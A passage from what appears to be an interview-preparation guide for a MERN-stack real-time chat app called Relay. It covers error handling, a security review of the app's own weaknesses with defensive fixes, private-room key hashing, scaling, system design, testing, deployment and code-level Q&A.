if (!name) return res.status(400).json({ message: 'Room name is required' });
```
**Frontend**: `err.response?.data?.message` extracted and shown in error banner

## Authentication errors

**Where**: `middleware/auth.js`
**Responses**: 401 "No authorization token" or 401 "Token is invalid or expired"
**Frontend**: `AuthContext` catches 401 on verify → clears token → user redirected to login

## Database errors

**Where**: Mongoose `.save()` failures
**How**: `try/catch` in every async route handler
**Duplicate key**: When unique constraint violated (duplicate username/email), Mongoose throws error with `code: 11000`. Currently caught by generic catch and returns 500 "Server error" — a known improvement area.

## Socket errors

**Where**: `socketHandler.js` — each event handler has `try/catch`
**How**: Errors are logged (`console.error`) but NOT sent to the client
**Improvement**: Emit error events back to the sender for user feedback

## Frontend network errors

```js
catch (err) {
  const errMsg = err.response?.data?.message || 'Fallback message';
  setFormError(errMsg);
}
```
- `err.response` — server responded with error status
- `err.request` — request sent, no response (server down)
- No properties — request never sent (network error)

## Missing environment variables

**Where**: `server.js` startup validation and `middleware/auth.js` module load
**How**: `process.exit(1)` — hard fail with clear error message
**Why hard fail**: Starting with missing secrets is more dangerous than not starting

---

# 29. Security Analysis

## ✅ Already implemented

### Password hashing — bcrypt cost 10
Passwords are never stored in plaintext. bcrypt with cost 10 takes ~100ms per hash — impractical to brute force at scale.

### JWT secret from environment
`JWT_SECRET` is loaded from `.env`. If missing, server exits. No hardcoded fallback (our improvement).

### Private room access key hashing — bcrypt
Access keys are hashed before storage (our improvement). The original stored plaintext keys. Now `bcrypt.compare()` is used for verification.

### CORS allow-list
Only the configured `CLIENT_URL` origin is allowed. Our fix prevents the bug where all origins were allowed when `CLIENT_URL` was absent.

### Environment files git-ignored
`.env` and `.env.*` are in `.gitignore`. Credentials are not committed.

### Authorization header cleanup
The original had a multi-line template literal bug: `"\n      \nBearer token"`. Fixed to `"Bearer token"`.

### Input trimming
`trim: true` in schemas, `.trim()` on user inputs in routes — prevents whitespace-only values.

### Generic error messages
"Invalid credentials" instead of "User not found" — prevents user enumeration.

## ❌ Not implemented / potential improvements

### Rate limiting
No rate limiting on login attempts. An attacker can attempt unlimited password guesses. **Improvement**: `express-rate-limit` middleware on auth routes.

### JWT in HttpOnly cookies
Tokens are stored in `localStorage`. JavaScript-accessible, so vulnerable to XSS attacks that steal tokens. **Improvement**: HttpOnly, Secure cookie-based token storage — JavaScript cannot read HttpOnly cookies.

### HTTPS
Running on plain HTTP locally. In production, all traffic must be over HTTPS to prevent token theft in transit.

### Input sanitization / NoSQL injection
`express-validator` or similar not used. MongoDB is safer than SQL (no SQL injection), but malformed ObjectIds and operator injection (`$where`, `$gt`) are possible. **Improvement**: Validate ObjectId format before `findById`.

### XSS (Cross-Site Scripting)
Message content is rendered as text (not HTML) in React — React escapes all string output by default. XSS via messages is not possible unless `dangerouslySetInnerHTML` is used (it is not).

### CSRF
JWT in Authorization header (not cookies) — CSRF attacks do not apply to header-based auth. CSRF would matter if moving to cookie-based auth.

### Socket.io authentication
The socket layer trusts `userId` from the frontend payload without verifying the JWT. A malicious client could send any `userId`. **Improvement**: Verify JWT in `socketHandler.js` using `socket.handshake.auth.token`.

### Brute force on private rooms
No rate limiting on join attempts with wrong access keys. **Improvement**: Rate limit or lockout on repeated failures.

### Sensitive data in JWT payload
The payload contains `id`, `username`, `email`. Email in JWT is readable by anyone who has the token (JWT is encoded, not encrypted). **Improvement**: Minimal payload — only `id`.

### Logging and monitoring
Only `console.log/error` — no structured logging, no alerting. **Improvement**: `winston` or `pino` for structured logs, Sentry for error monitoring.

---

# 30. Private Room Security

## Current implementation (after our improvement)

### Create private room

```
User creates room with isPrivate=true, accessKey="MySecret"
           ↓
POST /api/rooms → rooms.js
           ↓
if (isPrivate && !accessKey) → 400 error
           ↓
const salt = await bcrypt.genSalt(10);
hashedAccessKey = await bcrypt.hash("MySecret", salt);
           ↓
new Room({ ..., isPrivate: true, accessKey: "$2a$10$..." }).save()
           ↓
MongoDB stores: { isPrivate: true, accessKey: "$2a$10$9N..." }
```

### Join private room

```
User provides accessKey="MySecret"
           ↓
POST /api/rooms/:id/join { accessKey: "MySecret" }
           ↓
Room.findById(id) → room (has { isPrivate: true, accessKey: "$2a$10$..." })
           ↓
const isAlreadyMember = room.members.map(String).includes(String(user.id))
           ↓
if (room.isPrivate && !isAlreadyMember):
  if (!accessKey) → 401
  const isKeyValid = await bcrypt.compare("MySecret", "$2a$10$...")
  if (!isKeyValid) → 401 "Invalid access key"
           ↓
room.members.push(user.id)
await room.save()
Response: updated room
```

## Impact on existing rooms

Private rooms created before this security improvement stored the access key as plaintext. After the improvement, `bcrypt.compare("userInput", "plaintextStoredKey")` always returns `false` because bcrypt expects a hash, not plaintext. Those rooms' access keys are permanently broken and users cannot rejoin them with a key. Options:
1. Manually add affected users as members in MongoDB Atlas
2. Have the room creator recreate the room with a new key

---

# 31. Database Consistency and Concurrency

## Two users send simultaneously

Both socket events arrive at the Node.js server. The event loop processes them sequentially (one at a time). Each runs its `await newMessage.save()` independently on different documents. No conflict occurs. Both messages are saved. Both are broadcast to the room. Message ordering is determined by the `timestamp` field set at save time.

## Message saved to MongoDB but socket emit fails

The message is durably stored. When any room member reconnects, they load history via `loadHistory` and receive the message. From the receiver's perspective, the message appears on their next room join rather than immediately.

## Socket emit succeeds but MongoDB save fails

The catch block runs, no `io.to(roomId).emit('message', ...)` occurs. Other users do not see the message. The sender sees nothing. No rollback mechanism exists.

**Production improvement**: Emit an error event to the sender: `socket.emit('messageError', { content })` — the UI shows "Failed to send."

## MongoDB temporarily unavailable

If MongoDB goes down after startup, queries throw errors caught by route/socket try/catch blocks. The socket handlers log errors. The client receives either:
- No response (REST routes return 500)
- No message (socket handlers silently fail)

## Message duplication

Could happen if:
- A client re-emits `chatMessage` due to failed acknowledgement and network retry
- The server processes the same event twice

Current implementation has no deduplication (no idempotency key). **Production improvement**: Include a client-generated UUID with each message. Server checks if message with that UUID already exists before saving.

## Message ordering

Messages are sorted by `timestamp` (server-set at save time). If two messages arrive within the same millisecond, their relative order within that millisecond is non-deterministic. **Production improvement**: Use vector clocks or Lamport timestamps for strict ordering.

---

# 32. Performance

## Database query efficiency

✅ **What is implemented**:
- Compound index on `{ room: 1, timestamp: -1 }` in Message — covers the most frequent query
- `.limit(50)` on history queries — prevents fetching unbounded data
- Cursor-based pagination with `timestamp: { $lt: before }` — efficient for deep pagination
- `.select('-password')` on user queries — excludes large/sensitive fields

❌ **What is missing**:
- Index on `Room.name` (unique already creates an index — actually covered)
- Index on `User.email` and `User.username` (unique creates these — covered)
- No caching — every page load fetches all rooms from MongoDB

## Frontend rendering

- `messages` array grows indefinitely in memory during a session. With 1000+ messages, React re-renders all `Message` components on each new message.
- **Improvement**: Virtualized list (react-window) renders only visible messages

## Socket connections

One Socket.io connection per authenticated user. Each connection consumes ~50KB of server memory. At 1000 concurrent users: ~50MB — manageable on a single server.

## Payload size

Messages are returned as full MongoDB documents including all fields. No field projection on socket events. Large reaction arrays could grow unbounded.

---

# 33. Scalability

## Current capacity estimate

Single Node.js server on a typical VPS (2 CPU, 4GB RAM):
- HTTP requests: ~500 req/sec comfortably
- WebSocket connections: ~10,000 concurrent (Socket.io overhead)
- MongoDB Atlas: depends on tier — M0 (free) handles ~100 connections

## What breaks first

1. **Memory**: `activeRoomUsers` in `socketHandler.js` is an in-memory JavaScript object. On a single Node instance, it's fine. With multiple instances, each has its own copy — a user on instance A won't appear in instance B's presence list.
2. **Socket.io rooms**: Rooms are in-memory on each Node instance. A message emitted on instance A only reaches sockets connected to instance A.
3. **MongoDB free tier**: Connection and storage limits

## Scaling architecture

```
                          ┌────────────────┐
                          │  Load Balancer │
                          │  (Nginx / ALB) │
                          └──────┬─────────┘
                                 │
              ┌──────────────────┼──────────────────┐
              │                  │                  │
    ┌─────────▼──────┐ ┌─────────▼──────┐ ┌────────▼───────┐
    │  Node.js #1    │ │  Node.js #2    │ │  Node.js #3    │
    │  Express +     │ │  Express +     │ │  Express +     │
    │  Socket.io     │ │  Socket.io     │ │  Socket.io     │
    └────────┬───────┘ └────────┬───────┘ └────────┬───────┘
             │                  │                  │
             └──────────────────┼──────────────────┘
                                │
                    ┌───────────▼───────────┐
                    │         Redis          │
                    │  • Socket.io adapter   │
                    │  • Session/presence    │
                    │  • Message cache       │
                    └───────────┬───────────┘
                                │
                    ┌───────────▼───────────┐
                    │      MongoDB Atlas     │
                    │  Replica set + shards  │
                    └───────────────────────┘
```

**Redis Socket.io adapter**: `@socket.io/redis-adapter` publishes events to Redis Pub/Sub. When instance A emits to room X, Redis broadcasts to instances B and C, which forward to their connected sockets in room X.

**Sticky sessions**: WebSocket connections should go to the same backend instance. Load balancer configures sticky sessions (by cookie or IP hash) so reconnections land on the right instance.

**Stateless HTTP**: REST routes are already stateless — any instance can handle any request without coordination.

**Horizontal scaling of MongoDB**: Atlas supports replica sets (read scaling) and sharding (write scaling across shards).

---

# 34. System Design Questions

## "Design a real-time chat application"

**Requirements**: Millions of users, real-time messages, persistent history, rooms, presence.

**High-level answer**:

1. **Clients** connect via WebSocket (Socket.io with Redis adapter)
2. **Load balancer** with sticky sessions distributes WebSocket connections
3. **Multiple Node.js instances** handle HTTP and WebSocket
4. **Redis** for Socket.io pub/sub, presence data, rate limiting
5. **MongoDB/Cassandra** for message persistence (Cassandra is better for write-heavy chat at scale)
6. **Message fan-out**: When a message arrives, write to DB + publish to Redis → all instances forward to room members
7. **S3/CDN** for file/image attachments
8. **CDN** for frontend static assets

## "How would you design typing indicators?"

Typing events are ephemeral — they must not be persisted to MongoDB. In Relay, `socket.to(roomId).emit('typing', ...)` is used, which correctly skips database writes. At scale, you'd still use Socket.io pub/sub through Redis. TTL in Redis could store "user X typing in room Y" with a 3-second expiry.

## "Design message delivery guarantees"

At-most-once (current): Message saved → emitted. If client missed it, no retry.
At-least-once: Message stored in a queue (Redis, Kafka). Client acknowledges receipt. Server retries until acknowledged.
Exactly-once: Requires idempotency keys — complex to implement.

For a chat app, at-least-once with client deduplication (by message ID) is the practical target.

## "Design offline message delivery"

1. When a message is sent to room X, check which members are currently connected.
2. For offline members, write the message to an "undelivered" queue or mark it with a `deliveredTo[]` field.
3. When a user reconnects, query undelivered messages since their last seen timestamp.
4. Deliver and mark as delivered.

In Relay's current design, history loading on room join handles this sufficiently for the use case.

## "Design read receipts"

Add a `readBy: [{ userId, readAt }]` array to each Message. When a user views messages (IntersectionObserver on message DOM element), emit a `messageRead` socket event. Server updates the array and broadcasts `readUpdate` to the room. Expensive at scale — batch updates every few seconds.

---

# 35. DSA Connections

## Hash map — `activeRoomUsers`

```js
const activeRoomUsers = {};  // { roomId: [{socketId, userId, username}] }
```

O(1) lookup by roomId to get the list of online users. This is the most critical data structure for presence tracking.

## Set semantics — duplicate prevention

```js
const userExists = activeRoomUsers[roomId].some(u => u.userId === userId);
```

Prevents the same user from appearing twice in the presence list. O(n) linear scan — at chat room scale (hundreds of users), fine. At thousands of users, use a Set.

## Queue — event loop task queue

Node.js processes socket events through its event loop's task queue. Multiple simultaneous socket events are queued and processed sequentially.

## Cursor-based pagination — timestamp cursor

```js
Message.find({ room, timestamp: { $lt: new Date(before) } }).sort({ timestamp: -1 }).limit(50)
```

Instead of offset pagination (skip N records — O(N) DB scan), cursor pagination uses an indexed field as the next page marker. O(log N) with the index.

## Array operations on reactions

```js
message.reactions.findIndex(r => r.username === username)  // O(n)
message.reactions.push({ username, reaction })              // O(1) amortized
message.reactions.splice(existingIndex, 1)                  // O(n)
```

For small reaction arrays (typically < 100), these are fine.

## LRU Cache (not implemented, improvement)

Room list and user data could be cached with an LRU (Least Recently Used) cache — Redis with TTL or `lru-cache` npm package. Avoids repeated MongoDB queries for the same data.

---

# 36. OOP & Software Engineering

## Separation of concerns

Relay cleanly separates:
- **Routes** (`routes/auth.js`, `routes/rooms.js`): HTTP request handling
- **Models** (`models/*.js`): Data schema and database interaction
- **Middleware** (`middleware/auth.js`): Cross-cutting JWT concern
- **Socket handler** (`socket/socketHandler.js`): Real-time event handling
- **Frontend contexts**: Authentication state vs socket state vs component state

## Single Responsibility Principle

Each module has one job:
- `auth.js` route: authentication only
- `rooms.js` route: room CRUD only
- `socketHandler.js`: real-time events only
- `middleware/auth.js`: JWT verification only
- `api.js`: HTTP client configuration only

## DRY (Don't Repeat Yourself)

The `auth` middleware is defined once and imported wherever needed. The Axios instance with the interceptor is defined once in `api.js` and imported by any component that needs HTTP.

## Abstraction

`AuthContext` abstracts authentication: components call `login()` without knowing about Axios, localStorage, or JWT. `SocketContext` abstracts the socket connection lifecycle: components just destructure `{ socket, isConnected }`.

## Modularity / Reusability

`Avatar.jsx` is used in `Message.jsx`, `OnlineUsers.jsx`, and `ChatRoom.jsx` (navbar). `ConfirmModal.jsx` is a general-purpose dialog. `api.js` is imported by any file needing HTTP.

---

# 37. Git & Project Management

## Why `.env` must never be committed

1. MongoDB connection string contains username and password
2. JWT secret — if exposed, any attacker can sign tokens and authenticate as any user
3. Git history is permanent — deleting a file doesn't remove it from history
4. GitHub scans for secrets and may alert, but the damage is already done

## The current `.gitignore` rules

```
.env         — matches .env exactly
.env.*       — matches .env.local, .env.production, etc.
!.env.example  — EXCEPT .env.example (safe placeholder, should be committed)
```

## Why `INTERVIEW_PREPARATION.md` is git-ignored

Contains sensitive preparation material (project architecture, security weaknesses, personal notes) that should stay local and not be visible to anyone with repository access.

## Best practices for this project

- Never commit to `main` directly in a team — use feature branches + pull requests
- Branch naming: `feature/private-room-hashing`, `fix/cors-bug`, `refactor/auth-middleware`
- Commit messages: conventional commits format — `feat: add bcrypt to access keys`

---

# 38. Deployment

## Current local setup

```
Backend:   npm start → node server.js → http://localhost:5080
Frontend:  npm start → vite → http://localhost:3000 (proxies /api to :5080)
Database:  MongoDB Atlas (cloud) — accessible from anywhere
```

## Production deployment

### Frontend (static files)

```
npm run build
→ Creates dist/ directory (HTML, CSS, JS bundles)
→ Deploy dist/ to:
   - Vercel (auto-detects Vite, zero config)
   - Netlify
   - AWS S3 + CloudFront (CDN)
```

Set `VITE_API_URL=https://api.relay.yourapp.com` in the build environment.

### Backend (Node.js server)

Options:
- **Railway / Render**: Deploy from GitHub, auto-detect Node.js, set env vars in dashboard
- **AWS EC2**: Manual server management, more control
- **Heroku**: Easy dynos with `Procfile: web: node server.js`

Set all `.env` variables as environment variables in the deployment platform UI.

### Socket.io behind Nginx reverse proxy

```nginx
location / {
  proxy_pass http://localhost:5080;
  proxy_http_version 1.1;
  proxy_set_header Upgrade $http_upgrade;      # Required for WebSocket upgrade
  proxy_set_header Connection 'upgrade';
  proxy_set_header Host $host;
  proxy_cache_bypass $http_upgrade;
}
```

The `Upgrade` header is what tells Nginx to pass WebSocket connections through.

### HTTPS

- Nginx with Let's Encrypt (Certbot) — free SSL certificates
- Or use a platform with built-in HTTPS (Railway, Render, Vercel)

Once HTTPS is set, the `Secure` flag on cookies becomes enforceable, and HTTPS prevents token interception.

### MongoDB Atlas for production

- Upgrade from M0 (free) to M10+ for production workloads
- Enable IP access list — only allow your backend server IPs
- Enable Atlas Data API if needed
- Enable Atlas Search for full-text message search (future feature)

### Environment variables in production

Never put secrets in code. Use:
- Platform dashboard (Railway, Heroku, Render)
- AWS Secrets Manager
- HashiCorp Vault

---

# 39. Testing

## Current testing status

**No automated tests exist in the repository.** This is a significant gap.

## What should be tested

### Backend unit tests (Jest + Supertest)

```js
// Example: auth route tests
describe('POST /api/auth/register', () => {
  it('returns 400 if username missing', async () => {
    const res = await request(app).post('/api/auth/register')
      .send({ email: 'test@test.com', password: 'password123' });
    expect(res.status).toBe(400);
  });

  it('returns token on successful registration', async () => {
    const res = await request(app).post('/api/auth/register')
      .send({ username: 'alice', email: 'alice@test.com', password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty('token');
  });

  it('returns 400 for duplicate email', async () => { ... });
});
```

### Middleware tests

```js
describe('auth middleware', () => {
  it('returns 401 if no token provided', async () => { ... });
  it('returns 401 if token expired', async () => { ... });
  it('sets req.user for valid token', async () => { ... });
});
```

### Socket.io tests (socket.io-mock or real server)

```js
it('delivers message to all room members', async () => {
  const clientA = io(serverUrl);
  const clientB = io(serverUrl);
  clientA.emit('joinRoom', { roomId, username: 'alice', userId: '1' });
  clientB.emit('joinRoom', { roomId, username: 'bob', userId: '2' });
  clientA.emit('chatMessage', { roomId, message: 'hello', username: 'alice', userId: '1' });
  await expect(new Promise(resolve => clientB.on('message', resolve))).resolves.toMatchObject({ content: 'hello' });
});
```

### Frontend tests (React Testing Library + Vitest)

```js
it('shows error for empty login form', async () => {
  render(<Login />);
  fireEvent.click(screen.getByRole('button', { name: /sign in/i }));
  expect(screen.getByText(/please fill in all fields/i)).toBeInTheDocument();
});
```

### Integration tests

End-to-end flow: register → login → create room → join → send message → verify in MongoDB.

---

# 40. Debugging Scenarios

## Login suddenly stopped working

1. Open browser DevTools → Network tab → check the login request
2. Is the request reaching the server? (check Network tab status code)
3. 404? Server not running or wrong URL/proxy config
4. 401? JWT issue — but login doesn't require auth, so shouldn't happen
5. 500? Backend error — check server logs (`console.error` output in terminal)
6. Network error? CORS — check Console for CORS error message
7. Check `Authorization` header in backend terminal for the auth verify call
8. If the error is "Invalid credentials", test with correct credentials directly via Postman

## MongoDB not connecting

1. Check server startup logs for "MongoDB connection error"
2. Verify `MONGO_URI` in `.env` is correct
3. Check MongoDB Atlas: cluster is not paused (free tier pauses after inactivity)
4. Check Atlas network access: current IP is whitelisted (or 0.0.0.0/0 for dev)
5. Test connection string manually: `mongosh "mongodb+srv://..."`

## Messages not appearing in real-time

1. Check browser Console → any Socket.io errors?
2. Check if socket is connected: `isConnected` state in app
3. Network tab → WS filter → are WebSocket frames being sent/received?
4. Did the user successfully `joinRoom`? Check server logs
5. Are sender and receiver in the same Socket.io room? Check `activeRoomUsers` in server log
6. Is `io.to(roomId).emit('message', ...)` executing? Add `console.log` to verify

## API returns 401

1. Is the user logged in? Check localStorage for `token`
2. Is the token expired? Decode it at jwt.io and check `exp`
3. Is the Authorization header malformed? Check Network tab → Request Headers
4. Did the token get cleared? (`localStorage.removeItem` called somewhere)
5. Is `JWT_SECRET` the same as when the token was issued? (Changed secret → all old tokens invalid)

## CORS error

1. Check browser Console: "CORS policy: No 'Access-Control-Allow-Origin' header"
2. Is the backend running?
3. Is `CLIENT_URL` in `.env` set to the correct frontend origin?
4. Is the `cors()` middleware registered BEFORE routes in `server.js`?
5. For development: is the Vite proxy running? (`vite.config.js` proxy target correct?)

## Private rooms allow unauthorized users

1. Is `isPrivate` being set to `true` in the database? Check Atlas → rooms collection
2. Is `accessKey` stored as a bcrypt hash? Verify it starts with `$2a$10$`
3. Is the `isMember` check working? `room.members.map(String).includes(String(user.id))`
4. Is `bcrypt.compare(providedKey, storedHash)` returning false when it should?
5. Were the rooms created before the bcrypt improvement? (Those have plaintext keys — broken by design)

---

# 41. Code-Level Interview Questions

## server.js

**Q: Why does `const server = http.createServer(app)` instead of just `app.listen(PORT)`?**
A: `app.listen()` is a shorthand that creates an HTTP server internally but doesn't expose it. Socket.io needs a reference to the raw `http.Server` to attach its WebSocket handler. `http.createServer(app)` creates the server explicitly so it can be passed to `socketIo(server, ...)`.

**Q: What happens if `mongoose.connect()` fails?**
A: The `.catch()` handler calls `process.exit(1)` — the process terminates. Without the database, the app cannot function.

**Q: What does `process.env.NODE_ENV !== 'production'` check do?**
A: Determines if the app is in development. In development, CORS defaults to localhost. In production without `CLIENT_URL`, CORS blocks all origins — forcing a correct configuration.

**Q: What is the purpose of `app.use((req, res, next) => { req.io = io; next(); })`?**
A: Attaches the Socket.io `io` instance to every request object. Route handlers in `rooms.js` access `req.io.emit('roomCreated', ...)` to broadcast socket events from REST endpoints without importing `io` directly. This keeps the dependency injection clean.

## middleware/auth.js

**Q: Why does the middleware call `process.exit(1)` at module load rather than returning an error?**
A: If `JWT_SECRET` is missing, every single JWT verification would fail or — worse — pass with undefined key. This would be a catastrophic security failure. Failing at startup with a clear error is safer than silently operating insecurely.

**Q: What does `authHeader.substring(7, authHeader.length)` do? Why 7?**
A: `'Bearer '` is exactly 7 characters (6 letters + 1 space). `.substring(7)` extracts everything after `'Bearer '` — the actual JWT token string.

**Q: What happens if the JWT was signed with a different secret?**
A: `jwt.verify()` throws a `JsonWebTokenError` with message "invalid signature". The catch block returns 401. This prevents tokens from other services or forged tokens from being accepted.

## routes/auth.js

**Q: Why does login return "Invalid credentials" for both "user not found" and "wrong password"?**
A: User enumeration prevention. If the API returned different messages, an attacker could determine which emails have accounts.

**Q: Why is `email.toLowerCase()` called on both register and login?**
A: Email addresses are case-insensitive by standard. `alice@Example.com` and `alice@example.com` are the same. Normalizing to lowercase ensures consistent lookup.

**Q: What is `jwt.sign(payload, secret, options, callback)` — is it synchronous or asynchronous?**
A: With a callback, it's asynchronous. Without a callback, it returns the token synchronously. Relay uses the callback form — the token is returned inside the callback.

## routes/rooms.js

**Q: What does `!!isPrivate` do?**
A: Double negation coerces any truthy/falsy value to a strict boolean. If `isPrivate` is `"true"` (string from form), `!!"true"` = `true`. Ensures the field is stored as a proper boolean in MongoDB.

**Q: Why is `room.members.map(String).includes(String(req.user.id))` used instead of `.includes(req.user.id)`?**
A: MongoDB `members` is an array of ObjectId objects. `req.user.id` is a string (from JWT payload). Direct comparison of ObjectId to string returns `false`. Converting both to strings with `String(...)` ensures correct comparison.

**Q: What is cursor-based pagination vs offset pagination?**
A: Offset (`skip(N).limit(50)`) requires MongoDB to scan and discard N documents — O(N). As N grows, it gets slower. Cursor-based uses an indexed field as a pointer: `timestamp: { $lt: cursor }` uses the timestamp index — O(log N) regardless of how deep you paginate.

## socketHandler.js

**Q: What is the `activeRoomUsers` object and what is its limitation?**
A: An in-memory JavaScript object that maps roomId → list of connected users. Its limitation: it only exists on one Node.js process. In a multi-instance deployment, each instance has its own `activeRoomUsers` — presence information is fragmented.

**Q: What does `socket.join(roomId)` do?**
A: Registers this socket connection in Socket.io's internal room registry. After this call, `io.to(roomId).emit(...)` will include this socket.

**Q: What is the difference between `socket.to(roomId).emit(...)` and `io.to(roomId).emit(...)`?**
A: `socket.to(...)` excludes the current socket. `io.to(...)` includes everyone including the current socket. Relay uses `io.to(roomId).emit('message', ...)` — the sender also receives their own message through Socket.io (not through local state update).

**Q: Why does the `disconnect` handler use `removeUserFromAllRooms` instead of just one room?**
A: A user might have multiple rooms open (joined before disconnecting). On disconnect, they should be removed from all presence lists, not just the last active one.

## Frontend: AuthContext.jsx

**Q: Why does `useEffect` with empty deps `[]` only run once on mount?**
A: Empty dependency array tells React "this effect has no external dependencies that change." React runs it once after the first render and never again. It's used for one-time initialization like token verification.

**Q: What happens if the server is down when AuthContext tries to verify the token?**
A: The `api.get('/api/auth/verify')` throws. The catch block calls `localStorage.removeItem('token')` and `setUser(null)`. The user is treated as logged out. This is correct but may surprise the user if the server is temporarily unavailable.

## Frontend: SocketContext.jsx

**Q: Why does the socket connect/disconnect logic depend on `user` from AuthContext?**
A: The socket connection is tied to the user session. If the user logs out (`user` becomes null), the socket should disconnect immediately — there's no need for real-time events without a session. If a new user logs in, a fresh connection is established with their identity.

## Frontend: ChatRoom.jsx

**Q: Why is the `activeRoomUsers` dependency array `[activeRoom?._id, socket?.id]` instead of just `[activeRoom]`?**
A: `activeRoom` is a full object. If React used object reference equality, every re-render that creates a new object reference would re-run the effect even if the room ID didn't change. Using `activeRoom?._id` (a primitive string) ensures the effect only runs when the actual room changes. `socket?.id` handles socket reconnection — when the socket reconnects with a new ID, the effect needs to re-run to re-attach event listeners.

**Q: What does `isMember = activeRoom?.members?.map(String).includes(String(user.id))` calculate?**
A: Whether the current user is in the room's members array. Used to show either the chat interface (if member) or the join prompt (if not member). The `.map(String)` converts ObjectIds to strings for correct comparison.

---

# 42. Line-by-Line Walkthrough

## server.js — critical blocks

```js
// Block 1: Startup validation
const REQUIRED_ENV = ['MONGO_URI', 'JWT_SECRET'];
const missing = REQUIRED_ENV.filter((key) => !process.env[key]);
if (missing.length > 0) {
  console.error(`[FATAL] Missing required environment variables: ${missing.join(', ')}`);
  process.exit(1);
}
```
**What**: Checks that all required environment variables are present before doing anything else.
**Why**: Prevents the server from starting in an insecure or broken state.
**Interviewer Q**: "What does `process.exit(1)` do?" — A: Terminates the Node.js process with exit code 1 (non-zero = error). The OS/process manager sees the error code and can restart or alert.

```js
// Block 2: CORS origin handler
const corsOriginHandler = (origin, callback) => {
  if (!origin) return callback(null, true);
  if (allowedOrigins.includes(origin)) return callback(null, true);
  callback(new Error(`Origin '${origin}' is not allowed by CORS`));
};
```
**What**: Called by the `cors` middleware for every request.
**`!origin`**: No `Origin` header — curl, server-to-server, Postman. Always allowed.
**`allowedOrigins.includes(origin)`**: Explicit whitelist check.
**`callback(new Error(...))`**: Rejects the request — cors middleware returns a 403.

## socketHandler.js — chatMessage event

```js
socket.on('chatMessage', async ({ roomId, userId, username, message }) => {
  try {
    // Line A: Input validation
    if (!roomId || !userId || !username || !message || !message.trim()) return;

    // Line B: Create document (not saved yet)
    const newMessage = new Message({
      room: roomId,            // Mongoose casts string to ObjectId
      sender: userId,          // Mongoose casts string to ObjectId
      senderUsername: username, // Denormalized — stored directly
      content: message.trim(), // Trimmed to remove leading/trailing spaces
      messageType: 'text'      // Only text messages implemented
    });

    // Line C: Persist (async — event loop returns to other events while waiting)
    await newMessage.save();   // MongoDB assigned _id and timestamp during save

    // Line D: Broadcast to room (including sender)
    io.to(roomId).emit('message', newMessage);
    // newMessage here is the Mongoose document with _id and timestamp populated
  } catch (err) {
    console.error('[Socket] Chat message error:', err);
    // No client feedback — known limitation
  }
});
```

**Interviewer Q**: "Is `new Message(...)` synchronous?" — A: Yes. Creating a Mongoose document instance is synchronous — it's just creating a JavaScript object. Only `.save()` is async.

**Interviewer Q**: "What if `message.trim()` is empty?" — A: The `if (!message.trim())` check returns early — empty messages are not saved or broadcast.

## middleware/auth.js — jwt.verify

```js
const decoded = jwt.verify(token, process.env.JWT_SECRET);
```

**What happens internally**:
1. Splits token into header, payload, signature
2. Verifies signature: `HMACSHA256(header + '.' + payload, JWT_SECRET)` must match the provided signature
3. Checks `exp` claim against current time
4. Returns decoded payload as a JavaScript object
**Throws**: `JsonWebTokenError` (invalid), `TokenExpiredError` (expired), `NotBeforeError` (nbf not reached)

---

# 43. "Why This Technology?" Questions

## Why React instead of Vue or Angular?

**Short answer**: React has the largest ecosystem, most job market demand, and a component model that maps well to chat UI (rooms, messages, input are natural components). React's virtual DOM efficiently handles the frequent re-renders that come with real-time message streams.

**Tradeoffs**: React is a library, not a framework — you need to add routing (React Router), state management (Context), HTTP client (Axios) separately. Vue has better built-in solutions. Angular has more conventions but steeper learning curve.

## Why Node.js instead of Python/Django or Java/Spring?

**Short answer**: Node.js excels at handling many concurrent I/O-bound connections — exactly what a real-time chat server needs. Socket.io is built for Node.js. The JavaScript-on-both-ends reduces context switching.

**Tradeoffs**: Node.js is single-threaded — CPU-heavy tasks block the event loop. Python has stronger ML libraries. Java has better performance for CPU-intensive work.

## Why Express instead of Fastify or NestJS?

**Short answer**: Express is the industry standard for Node.js APIs. Minimal, flexible, huge ecosystem, easy to add exactly the middleware needed. For a project this size, Express's simplicity is an advantage.

**Tradeoffs**: Fastify is faster (benchmarks show 2-3x throughput). NestJS provides more structure (TypeScript, decorators, dependency injection) — better for large teams. Express gives full control.

## Why MongoDB instead of PostgreSQL?

**Short answer**: Chat messages are naturally document-shaped (with embedded reactions, variable content). MongoDB's flexible schema means no migrations when adding features. Horizontal scaling (sharding) matches the write-heavy nature of chat.

**Tradeoffs**: PostgreSQL has strong ACID guarantees, better for relational data (financial systems). MongoDB's eventual consistency in certain configurations can cause stale reads. For strictly relational data with complex joins, PostgreSQL wins.

**Interviewer follow-up**: "What if your Message document grows huge?"
A: Reactions are embedded in messages. If a message has thousands of reactions (viral), the document grows. MongoDB has a 16MB document size limit. Mitigation: store reactions in a separate collection indexed by messageId.

## Why Socket.io instead of raw WebSocket?

**Short answer**: Socket.io adds critical features on top of WebSocket: automatic reconnection, rooms (essential for multi-room chat), fallback to polling for environments where WebSocket is blocked, and named events instead of raw message strings.

**Tradeoffs**: Socket.io adds overhead (~150KB client bundle). If you control both client and server and know WebSocket always works, raw WebSocket is more efficient. For a production chat app, Socket.io's reliability features justify the overhead.

## Why JWT instead of sessions?

**Short answer**: JWT is stateless — the server doesn't need a session store (Redis, database). Each request is self-contained. Works well for horizontal scaling where any server instance can verify any token.

**Tradeoffs**: Sessions can be instantly invalidated (delete from store). JWT tokens live until expiry — you can't "revoke" them without a token blacklist (which reintroduces state). For Relay's 7-day expiry, this means a logged-out user's old token remains valid for up to 7 days if someone has it.

## Why Vite instead of Create React App (CRA)?

**Short answer**: Vite is dramatically faster. CRA bundles all modules on every save (Webpack). Vite serves native ES modules in development — only changed files are processed. Hot reload is near-instant.

**Tradeoffs**: Vite is newer — some Webpack plugins don't have Vite equivalents. CRA has more legacy documentation. For new projects in 2024+, Vite is the clear choice.

---

# 44. Tradeoffs

## MongoDB vs PostgreSQL for Relay

| | MongoDB | PostgreSQL |
|--|---------|-----------|
| Schema | Flexible, no migrations | Strict, requires migrations |
| Reactions | Natural embedded array | Separate table with foreign keys |
| Scaling | Horizontal sharding | Vertical primary, read replicas |
| ACID | Per-document only | Full multi-table transactions |
| Use when | Document-oriented, evolving schema | Complex relationships, financial data |
| **Choice** | ✅ Good fit for chat messages | ❌ Over-engineered for this use case |

## REST vs WebSocket (Relay's hybrid)

| | REST | WebSocket |
|--|------|-----------|
| Pattern | Request-response | Bidirectional push |
| For auth | ✅ Natural (stateless, header-based) | ❌ Awkward |
| For history | ✅ HTTP caching possible | ❌ No caching semantics |
| For messages | ❌ Would require polling | ✅ Real-time push |
